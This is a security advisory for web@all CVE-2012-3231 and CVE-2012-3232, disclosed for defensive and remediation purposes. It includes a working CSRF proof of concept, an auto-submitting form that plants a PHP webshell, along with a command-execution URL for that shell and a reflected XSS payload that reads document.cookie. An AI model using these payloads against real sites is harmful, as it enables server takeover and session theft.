Advisory Details:

High-Tech Bridge Security Research Lab has discovered multiple vulnerabilities in web@all, which can be exploited to perform Сross-Site Request Forgery (CSRF) and Cross-Site Scripting (XSS) attacks.


1) Сross-Site Request Forgery (CSRF) in web@all: CVE-2012-3231

1.1 The application allows authorized administrator to perform certain actions via HTTP requests without making proper validity checks to verify the source of the requests. This can be exploited to add, delete or modify sensitive information, for example to create arbitrary files.

To exploit this vulnerability an attacker should make logged-in administrator open a malicious link in browser.

The following CSRF PoC (Proof of Concept) will create a very simple webshell:


<form action="http://[host]/inc/browser/action.php" method="post" name="main" id="main">
<input type="hidden" name="content" value='<? system($_GET["cmd"]);?>'>
<input type="hidden" name="_file" value="cmd.php">
<input type="hidden" name="_act" value="do_addfile">
<input type="hidden" name="_echoMSG" value="js_silent">
<input type="submit" id="btn"> 
</form>
<script>
document.getElementById('btn').click();
</script>



After a logged-in administrator will visit the malicious page a webshell will normally allow remote command execution (depending on web server configuration):

http://[host]/cmd.php?cmd=ls -la;id;pwd;uname -a; 


2) Cross-Site Scripting (XSS) in web@all: CVE-2012-3232

2.1 Input passed via the "_text[title]" GET parameter to /search.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://webatall/search.php?_text[title]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

-----------------------------------------------------------------------------------------------

Solution:

Fixed by vendor on May 30, 2012 directly in the source code without version modification/new release. Upgrade to the version 2.0 released after May 30, 2012.
